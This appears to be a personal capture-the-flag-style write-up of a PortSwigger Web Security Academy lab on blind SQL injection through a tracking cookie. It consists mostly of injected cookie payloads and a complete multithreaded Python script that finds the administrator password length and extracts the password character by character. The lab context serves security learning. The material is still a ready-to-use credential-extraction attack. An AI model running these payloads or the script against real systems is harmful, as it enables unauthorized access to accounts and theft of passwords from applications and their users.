
![[Pasted image 20251212231232.png]]


![[Pasted image 20251212231526.png]]


![[Pasted image 20251212231637.png]]


```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND '1'='1'-- -
```
![[Pasted image 20251212232516.png]]


```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT 'a' FROM users LIMIT 1)='a'-- -
```
![[Pasted image 20251212233018.png]]


```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT 'a' FROM users LIMIT 1)='a'-- -
```
![[Pasted image 20251212233111.png]]


```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'-- -
```
![[Pasted image 20251212233324.png]]


```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a'-- -
```
![[Pasted image 20251212234014.png]]


Or , we can use python script for brutforce
![[Pasted image 20251213002537.png]]
```

  

import requests

import time

import sys

from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "https://0a7000dc042b87a080c67b7300b50076.web-security-academy.net/"

COOKIE_TRACKING_BASE = "dK3rgvEMlHmFaOiz"

COOKIE_SESSION = "HAgg2HcVZqaHHh4LJISMWpSdT3nRND8G"

INDICATOR = "Welcome back"

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"

MAX_LEN = 30

THREADS = 10

DELAY = 0.05

TIMEOUT = 10

HEADERS = {

    "Host": "0a7000dc042b87a080c67b7300b50076.web-security-academy.net",

    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",

    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",

    "Accept-Language": "en-US,en;q=0.5",

    "Accept-Encoding": "gzip, deflate, br",

    "Upgrade-Insecure-Requests": "1",

    "Sec-Fetch-Dest": "document",

    "Sec-Fetch-Mode": "navigate",

    "Sec-Fetch-Site": "none",

    "Sec-Fetch-User": "?1",

    "Priority": "u=0, i",

    "Te": "trailers"

}

session = requests.Session()

session.headers.update({"User-Agent": HEADERS["User-Agent"]})

session.verify = True

def send_with_payload(payload):

    cookies = {

        "TrackingId": COOKIE_TRACKING_BASE + payload,

        "session": COOKIE_SESSION

    }

    try:

        r = session.get(URL, cookies=cookies, timeout=TIMEOUT)

        return INDICATOR in r.text

    except requests.RequestException:

        return False

def length_gt(n):

    payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > {n}) = 'a'--"

    ok = send_with_payload(payload)

    if DELAY:

        time.sleep(DELAY)

    return ok

def char_at_equals(pos, ch):

    payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator') = '{ch}'--"

    ok = send_with_payload(payload)

    if DELAY:

        time.sleep(DELAY)

    return ok

def discover_length(max_len=MAX_LEN):

    lo = 0

    hi = max_len

    while lo < hi:

        mid = (lo + hi + 1) // 2

        if length_gt(mid):

            lo = mid

        else:

            hi = mid - 1

    discovered = lo + 1

    if discovered <= max_len:

        return discovered

    return None

def extract_password(length, charset=CHARSET, threads=THREADS):

    password = ["?"] * length

    for pos in range(1, length + 1):

        found_char = None

        def check_char(ch):

            try:

                return ch if char_at_equals(pos, ch) else None

            except Exception:

                return None

        with ThreadPoolExecutor(max_workers=threads) as ex:

            futures = {ex.submit(check_char, ch): ch for ch in charset}

            for fut in as_completed(futures):

                result = fut.result()

                if result:

                    found_char = result

                    break

        if found_char is None:

            print(f"[!] Could not find character for position {pos}", file=sys.stderr)

            break

        password[pos - 1] = found_char

        print(f"[+] Found pos {pos}: {found_char} -> {''.join(password)}")

    return "".join(password)

def main():

    print("[*] Discovering password length...")

    length = discover_length()

    if not length or length == 0:

        print("[!] Could not determine password length", file=sys.stderr)

        sys.exit(1)

    print(f"[+] Discovered password length: {length}")

    print("[*] Extracting password...")

    pwd = extract_password(length)

    print("\n=== RESULT ===")

    print(f"Password (length {length}): {pwd}")

if __name__ == "__main__":

    main()

```


![[Pasted image 20251213002606.png]]


![[Pasted image 20251213002621.png]]
